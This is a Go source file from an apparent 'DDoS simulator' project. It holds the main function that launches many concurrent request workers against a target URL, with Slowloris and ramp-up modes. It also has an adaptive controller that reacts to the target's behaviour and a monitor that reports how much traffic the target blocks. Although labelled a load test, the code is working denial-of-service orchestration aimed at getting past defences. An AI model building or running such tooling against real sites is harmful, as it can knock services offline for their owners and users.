package attack

import (
	"context"
	"fmt"
	"sync"
	"sync/atomic"
	"time"

	"ddos-sim/internal/config"
	"ddos-sim/internal/metrics"

	"github.com/fatih/color"
	"golang.org/x/time/rate"
)

// StartLoadTest runs the full load test based on the given config.
func StartLoadTest(parentCtx context.Context, cfg *config.TestConfig) {
	color.Cyan("======================================")
	color.Cyan("          DDoS SIMULATOR              ")
	color.Cyan("======================================")
	color.White("\n  Target:   %s", cfg.URL)
	color.White("  Mode:     %s", cfg.Mode)
	if cfg.TotalRequests > 0 {
		color.White("  Requests: %d", cfg.TotalRequests)
	}
	if cfg.Duration < 24*time.Hour {
		color.White("  Duration: %v", cfg.Duration)
	}
	color.White("  Workers:  %d", cfg.ConcurrentWorkers)
	if cfg.RequestsPerSecond > 0 {
		color.White("  RPS Cap:  %d", cfg.RequestsPerSecond)
	}
	if len(cfg.Methods) > 0 {
		color.White("  Methods:  %v", cfg.Methods)
	}
	if len(cfg.Paths) > 0 {
		color.White("  Paths:    %d endpoints", len(cfg.Paths))
	}
	fmt.Println()

	m := metrics.New()
	var wg sync.WaitGroup
	var requestCounter int64

	ctx, cancel := context.WithTimeout(parentCtx, cfg.Duration)
	defer cancel()

	startTime := time.Now()

	if cfg.Mode == config.ModeSlowloris {
		for i := 0; i < cfg.ConcurrentWorkers; i++ {
			wg.Add(1)
			go SlowlorisWorker(i, cfg, m, &wg, ctx, &requestCounter)
		}
	} else {
		var rateLimiter *rate.Limiter
		if cfg.RequestsPerSecond > 0 {
			burst := cfg.RequestsPerSecond
			if burst > 1000 {
				burst = 1000
			}
			rateLimiter = rate.NewLimiter(rate.Limit(cfg.RequestsPerSecond), burst)
		}

		adaptive := &AdaptiveController{}

		go func() {
			ticker := time.NewTicker(3 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					adaptive.Update(m)
				}
			}
		}()

		color.Cyan("  Warming up sessions...")

		if cfg.Mode == config.ModeRamp {
			initialWorkers := cfg.ConcurrentWorkers / 10
			if initialWorkers < 1 {
				initialWorkers = 1
			}

			for i := 0; i < initialWorkers; i++ {
				wg.Add(1)
				go runWorker(i, cfg, m, &wg, ctx, rateLimiter, &requestCounter, adaptive)
			}

			go func() {
				remaining := cfg.ConcurrentWorkers - initialWorkers
				batchSize := remaining / 10
				if batchSize < 1 {
					batchSize = 1
				}
				launched := initialWorkers
				for launched < cfg.ConcurrentWorkers {
					select {
					case <-ctx.Done():
						return
					case <-time.After(3 * time.Second):
						toAdd := batchSize
						if launched+toAdd > cfg.ConcurrentWorkers {
							toAdd = cfg.ConcurrentWorkers - launched
						}
						for i := 0; i < toAdd; i++ {
							wg.Add(1)
							go runWorker(launched+i, cfg, m, &wg, ctx, rateLimiter, &requestCounter, adaptive)
						}
						launched += toAdd
						color.Yellow("  -> Ramped to %d/%d workers", launched, cfg.ConcurrentWorkers)
					}
				}
			}()
		} else {
			for i := 0; i < cfg.ConcurrentWorkers; i++ {
				wg.Add(1)
				go runWorker(i, cfg, m, &wg, ctx, rateLimiter, &requestCounter, adaptive)
			}
		}
	}

	// Progress monitor
	done := make(chan struct{})
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		var lastTotal int64

		for {
			select {
			case <-ticker.C:
				total := atomic.LoadInt64(&m.TotalRequests)
				blocked := atomic.LoadInt64(&m.BlockedRequests)
				elapsed := time.Since(startTime).Seconds()
				currentRPS := float64(total) / elapsed
				intervalRPS := float64(total-lastTotal) / 5.0
				lastTotal = total

				statusStr := color.GreenString("OK")
				if blocked > 0 && total > 0 {
					blockRate := float64(blocked) / float64(total) * 100
					if blockRate > 50 {
						statusStr = color.RedString("BLOCKED %.0f%%", blockRate)
					} else if blockRate > 10 {
						statusStr = color.YellowString("PARTIAL %.0f%%", blockRate)
					}
				}

				fmt.Printf("  [%s] RPS: %.0f (avg %.0f) | Total: %d | Blocked: %d | %s\n",
					time.Since(startTime).Round(time.Second), intervalRPS, currentRPS, total, blocked, statusStr)
			case <-done:
				return
			}
		}
	}()

	wg.Wait()
	close(done)
	cancel()
	m.TotalDuration = time.Since(startTime)

	m.PrintSummary()
}
